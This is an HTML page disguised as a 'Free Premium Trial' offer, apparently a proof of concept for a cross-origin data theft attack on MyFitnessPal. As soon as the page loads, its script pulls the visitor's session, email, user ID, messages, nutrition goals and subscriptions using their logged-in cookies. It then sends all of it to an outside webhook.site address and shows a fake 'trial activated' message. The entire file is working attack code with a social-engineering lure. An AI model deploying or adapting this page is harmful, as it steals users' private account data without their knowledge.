<!DOCTYPE html>
<html>
<head><title>Free Premium Trial</title></head>
<body>
<h2>Claiming your free trial...</h2>
<div id="log"></div>
<script>
const exfil = "https://webhook.site/6e09acf4-6781-452a-87e7-9351b357f208";
const log = document.getElementById("log");

function addLog(msg) {
  log.innerHTML += "<p>" + msg + "</p>";
}

async function steal() {
  try {
    const session = await fetch("https://www.myfitnesspal.com/api/auth/session", {
      credentials: "include"
    }).then(r => r.json());
    addLog("Session OK: " + session.email + " | " + session.userId);

    const messages = await fetch("https://www.myfitnesspal.com/api/services/messages", {
      credentials: "include"
    }).then(r => r.json());
    addLog("Messages OK");

    const goals = await fetch("https://www.myfitnesspal.com/api/services/nutrient-goals", {
      credentials: "include"
    }).then(r => r.json());
    addLog("Goals OK");

    const subs = await fetch("https://www.myfitnesspal.com/api/services/user-subscriptions?country=TH&language=en", {
      credentials: "include"
    }).then(r => r.json());
    addLog("Subscriptions OK");

    const data = encodeURIComponent(JSON.stringify({
      email: session.email,
      userId: session.userId,
      tier: session.currentTier,
      expires: session.expires,
      messages: messages,
      goals: goals,
      subscriptions: subs
    }));

    new Image().src = exfil + "?data=" + data;
    addLog("Sent to attacker server!");
    document.body.innerHTML += "<h3>Free trial activated!</h3>";

  } catch(e) {
    addLog("Error: " + e.message);
  }
}

steal();
</script>
</body>
</html>
